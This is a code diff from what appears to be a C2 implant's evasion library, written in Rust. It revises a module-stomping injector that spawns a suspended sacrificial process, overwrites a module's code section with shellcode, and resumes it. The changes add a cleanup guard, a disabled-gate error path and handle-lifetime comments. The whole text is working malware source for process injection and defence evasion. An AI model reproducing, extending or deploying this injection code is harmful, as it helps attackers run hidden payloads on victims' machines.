@@ -305,7 +305,9 @@ impl MemoryMaskKit for LiveMemoryMask {
 // full module-stomping path runs (spawn suspended → stomp `.text` → resume).
 // `set_modulestomp_enabled(false)` collapses it to a verifiable data path
 // (CreateProcessW suspended, no cross-process execute) for targets that forbid
-// cross-process injection.
+// cross-process injection. module_stomp owns cleanup: the returned
+// `SacrificialProcess` is Drop-guarded (terminate + close both handles on
+// every non-success path; close-only once the target was resumed).
 
 /// Live process injector: module stomping. See [`crate::inject`] for the
 /// technique + why the execution tail is gated.
@@ -317,11 +319,23 @@ impl nyx_implant_evasionsdk::ProcessInjectKit for ModuleStomper {
         spawn_to: &str,
         shellcode: &[u8],
     ) -> Result<nyx_implant_evasionsdk::InjectHandle, EvasionError> {
-        // SAFETY: runs in the single-threaded beacon context. With the stomp
-        // gate OFF (default) this only creates a suspended sacrificial process
-        // and returns its handle — no cross-process write/execute.
-        unsafe { crate::inject::module_stomp(spawn_to, shellcode) }
-            .map(|h| nyx_implant_evasionsdk::InjectHandle::new(h))
-            .map_err(|msg| EvasionError::Other(heap_str(msg)))
+        // SAFETY: runs in the single-threaded beacon context. module_stomp
+        // owns cleanup via the Drop-guarded SacrificialProcess: on failure it
+        // terminates + closes; on success it closes the handles (fire-and-
+        // forget) once the target was resumed.
+        if !crate::inject::modulestomp_enabled() {
+            // Disarmed: module_stomp would create a suspended sacrificial
+            // that the Drop guard then terminates — never report success for
+            // a process that was killed before it ran anything.
+            return Err(EvasionError::Other(heap_str("module stomp disabled")));
+        }
+        let proc = unsafe { crate::inject::module_stomp(spawn_to, shellcode) }
+            .map_err(|msg| EvasionError::Other(heap_str(msg)))?;
+        // The guard closes the handles when `proc` drops at the end of this
+        // call; the returned InjectHandle is therefore a STALE diagnostic
+        // snapshot (pid/type only), not an operable handle — callers must not
+        // use it for handle operations.
+        let pid = proc.pid;
+        Ok(nyx_implant_evasionsdk::InjectHandle::new(pid as usize))
     }
 }
